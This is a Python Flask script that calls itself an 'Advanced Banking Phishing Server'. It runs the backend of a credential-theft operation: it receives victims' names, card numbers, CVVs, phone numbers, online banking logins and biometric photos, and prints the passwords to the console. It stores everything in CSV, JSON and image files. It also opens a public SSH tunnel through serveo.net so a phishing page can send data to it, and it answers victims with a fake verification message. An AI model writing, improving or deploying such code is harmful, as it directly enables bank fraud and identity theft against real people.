from flask import Flask, request, jsonify
from datetime import datetime
import os
import json
import threading
from colorama import Fore, Style, init
import base64
import csv
import subprocess
import re
import time

# Initialize
init(autoreset=True)
app = Flask(__name__)

# Configuration
CONFIG = {
    "DATA_DIR": "victim_data",
    "CREDS_FILE": "bank_credentials.csv",
    "FULL_LOGS": "complete_logs.json",
    "PHOTO_DIR": "biometric_data"
}

class DataManager:
    @staticmethod
    def initialize():
        """Create all required directories and files"""
        try:
            os.makedirs(CONFIG["DATA_DIR"], exist_ok=True)
            os.makedirs(os.path.join(CONFIG["DATA_DIR"], CONFIG["PHOTO_DIR"]), exist_ok=True)
            
            creds_path = os.path.join(CONFIG["DATA_DIR"], CONFIG["CREDS_FILE"])
            if not os.path.exists(creds_path):
                with open(creds_path, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow([
                        'timestamp', 'ip_address', 'full_name', 
                        'card_number', 'expiry', 'cvv',
                        'phone_number', 'online_banking_id',
                        'online_banking_password', 'biometric_data'
                    ])
            
            logs_path = os.path.join(CONFIG["DATA_DIR"], CONFIG["FULL_LOGS"])
            if not os.path.exists(logs_path):
                with open(logs_path, 'w') as f:
                    json.dump([], f)
            
            print(f"{Fore.GREEN}[✓] Data system initialized{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] Initialization failed: {e}{Style.RESET_ALL}")
            return False

    @staticmethod
    def save_data(data):
        """Save all victim data"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            ip = data.get('meta', {}).get('ip', 'unknown').replace('.', '_')
            
            json_filename = f"{timestamp}_{ip}_full.json"
            with open(os.path.join(CONFIG["DATA_DIR"], json_filename), 'w') as f:
                json.dump(data, f, indent=4)
            
            with open(os.path.join(CONFIG["DATA_DIR"], CONFIG["CREDS_FILE"]), 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow([
                    datetime.now().isoformat(),
                    data.get('meta', {}).get('ip', 'N/A'),
                    data.get('personal_info', {}).get('name', 'N/A'),
                    data.get('payment_info', {}).get('card_number', 'N/A'),
                    data.get('payment_info', {}).get('expiry', 'N/A'),
                    data.get('payment_info', {}).get('cvv', 'N/A'),
                    data.get('contact_info', {}).get('phone', 'N/A'),
                    data.get('bank_credentials', {}).get('username', 'N/A'),
                    data.get('bank_credentials', {}).get('password', 'N/A'),
                    'Yes' if data.get('biometrics') else 'No'
                ])
            
            logs_path = os.path.join(CONFIG["DATA_DIR"], CONFIG["FULL_LOGS"])
            with open(logs_path, 'r+') as f:
                logs = json.load(f)
                logs.append(data)
                f.seek(0)
                json.dump(logs, f, indent=4)
            
            if 'biometrics' in data:
                for name, img_data in data['biometrics'].items():
                    if img_data.startswith('data:image'):
                        img_bytes = base64.b64decode(img_data.split(',')[1])
                        photo_path = os.path.join(
                            CONFIG["DATA_DIR"],
                            CONFIG["PHOTO_DIR"],
                            f"{timestamp}_{ip}_{name}.jpg"
                        )
                        with open(photo_path, 'wb') as f:
                            f.write(img_bytes)
            
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] Data save error: {e}{Style.RESET_ALL}")
            return False

def start_serveo():
    """Initialize Serveo tunnel using SSH with reliable URL capture"""
    try:
        # Start SSH tunnel in the background
        process = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:5000", "serveo.net"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Wait for tunnel to establish
        time.sleep(3)
        
        # Read the output to find the URL
        output = process.stdout.readline()
        while output:
            if "Forwarding" in output:
                url_match = re.search(r'https://[a-zA-Z0-9-]+\.serveo\.net', output)
                if url_match:
                    public_url = url_match.group(0)
                    print(f"\n{Fore.GREEN}[✓] Serveo Tunnel Active:{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}Public URL:{Style.RESET_ALL} {public_url}")
                    return public_url
            output = process.stdout.readline()
        
        print(f"{Fore.RED}[✗] Failed to get Serveo URL{Style.RESET_ALL}")
        return None
        
    except Exception as e:
        print(f"{Fore.RED}[✗] Serveo error:{Style.RESET_ALL} {e}")
        return None

@app.route('/submit', methods=['POST'])
def handle_submission():
    """Endpoint for receiving all victim data"""
    try:
        data = request.json
        
        data['meta'] = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'received_at': datetime.now().isoformat(),
            'server': os.uname().nodename
        }
        
        print(f"\n{Fore.RED}🔥 NEW VICTIM SUBMISSION{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}IP:{Style.RESET_ALL} {data['meta']['ip']}")
        print(f"{Fore.YELLOW}Bank ID:{Style.RESET_ALL} {data.get('bank_credentials', {}).get('username')}")
        print(f"{Fore.YELLOW}Password:{Style.RESET_ALL} {data.get('bank_credentials', {}).get('password')}")
        
        threading.Thread(target=DataManager.save_data, args=(data,)).start()
        
        return jsonify({
            "status": "success",
            "message": "Verification complete. Redirecting..."
        }), 200
    except Exception as e:
        print(f"{Fore.RED}[✗] Submission error:{Style.RESET_ALL} {e}")
        return jsonify({
            "status": "error",
            "message": "Temporary system issue. Please try again."
        }), 500

def print_banner():
    print(f"""{Fore.BLUE}
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║ ██╔╝██║████╗  ██║██╔════╝ 
██████╔╝███████║██║███████╗███████║█████╔╝ ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔═██╗ ██║██║╚██╗██║██║   ██║
██║     ██║  ██║██║███████║██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
{Style.RESET_ALL}""")
    print(f"{Fore.YELLOW}Advanced Banking Phishing Server v6.1{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Data Directory:{Style.RESET_ALL} {os.path.abspath(CONFIG['DATA_DIR'])}")

if __name__ == '__main__':
    print_banner()
    DataManager.initialize()
    public_url = start_serveo()
    
    if public_url:
        print(f"\n{Fore.GREEN}[!] Add this to your phishing page:{Style.RESET_ALL}")
        print(f"const SERVER_URL = '{public_url}/submit';")
    else:
        print(f"\n{Fore.RED}[!] Using localhost only - not accessible remotely{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Local URL:{Style.RESET_ALL} http://192.168.0.102:5000/submit")
    
    app.run(host='0.0.0.0', port=5000)